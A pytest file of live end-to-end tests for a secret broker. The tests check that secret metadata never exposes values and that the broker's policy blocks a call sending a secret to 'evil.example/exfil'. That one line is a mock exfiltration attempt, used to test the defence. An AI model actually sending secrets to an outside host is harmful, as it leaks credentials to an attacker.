"""Live backend E2E — skipped unless SECRET_BROKER_E2E_LIVE=1."""

from __future__ import annotations

import os

import pytest

from secret_broker.broker import Broker
from secret_broker.config import load_config
from secret_broker.policy import PolicyDenied

pytestmark = pytest.mark.e2e_live


def _live_enabled() -> bool:
    return os.environ.get("SECRET_BROKER_E2E_LIVE", "").strip() in {"1", "true", "yes"}


requires_live = pytest.mark.skipif(
    not _live_enabled(),
    reason="Set SECRET_BROKER_E2E_LIVE=1 and backend refs to run live E2E",
)


@requires_live
@pytest.mark.parametrize(
    "env_key",
    [
        "SECRET_BROKER_E2E_AWS_REF",
        "SECRET_BROKER_E2E_OP_REF",
        "SECRET_BROKER_E2E_VAULT_REF",
    ],
)
def test_live_describe_never_returns_value_field(env_key: str):
    ref = os.environ.get(env_key, "").strip()
    if not ref:
        pytest.skip(f"{env_key} not set")
    broker = Broker(config=load_config(), actor="e2e-live")
    meta = broker.describe(ref)
    dumped = meta.model_dump()
    assert "value" not in dumped
    assert meta.ref.startswith("secret://")


@requires_live
def test_live_call_deny_off_allowlist():
    ref = (
        os.environ.get("SECRET_BROKER_E2E_AWS_REF")
        or os.environ.get("SECRET_BROKER_E2E_OP_REF")
        or os.environ.get("SECRET_BROKER_E2E_VAULT_REF")
        or ""
    ).strip()
    if not ref:
        pytest.skip("no live ref configured")
    broker = Broker(config=load_config(), actor="e2e-live")
    with pytest.raises(PolicyDenied):
        broker.call(url="https://evil.example/exfil", ref_str=ref)
